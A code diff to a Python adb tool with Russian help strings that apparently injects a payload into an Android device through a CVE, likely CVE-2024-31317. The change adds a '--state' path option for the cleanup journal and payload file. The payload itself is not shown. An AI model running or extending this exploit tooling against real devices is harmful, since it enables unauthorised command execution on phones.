@@ -135,13 +135,15 @@ def main():
     ap.add_argument("--encode", metavar="STRING",
                     help="конвертер строка -> printf-экранирование, печатает и выходит")
     ap.add_argument("--cleanup", action="store_true", help="восстановить настройки из локального журнала, без инъекции")
+    ap.add_argument("--state", type=Path, default=None, help="путь журнала временных настроек выбранного сеанса")
     a = ap.parse_args()
+    state_path = a.state if a.state is not None else DEFAULT_STATE
 
     if a.cleanup:
         if a.cmd or a.encode is not None:
             ap.error("--cleanup нельзя совмещать с --cmd/--encode")
         try:
-            cleaned = cleanup_pending(adb_exe=a.adb)
+            cleaned = cleanup_pending(state_path, adb_exe=a.adb)
         except (CleanupError, OSError, ValueError) as error:
             print(f"CLEANUP PENDING: {error}", file=sys.stderr)
             return 1
@@ -153,7 +155,7 @@ def main():
         return 0
     if a.log_tag and not a.cmd:
         ap.error("--log-tag применим только вместе с --cmd")
-    if DEFAULT_STATE.exists():
+    if state_path.exists():
         print("Предыдущая очистка CVE не завершена. Используйте --cleanup "
               "или общий сценарий --recover.", file=sys.stderr)
         return 2
@@ -230,13 +232,13 @@ def main():
               "маркером в выводе команды).", file=sys.stderr)
         return 1
 
-    with InjectionCleanup(a.adb) as injection:
+    with (InjectionCleanup(a.adb, state_path) if a.state is not None else InjectionCleanup(a.adb)) as injection:
         adb = [a.adb, "-s", injection.serial]
         print("[2/5] отключаем USAP-пул (лечит 'молчаливые' отказы инъекции)...")
         sh(adb, "device_config put activity_manager native_usap_pool_enabled false")
 
         print("[3/5] Подготовка payload...")
-        p = Path("p31317.txt")
+        p = state_path.with_name("p31317.txt")
         p.write_text(payload, encoding="utf-8", newline="\n")
         print(f"      payload: {len(payload)} байт -> {p}")
 
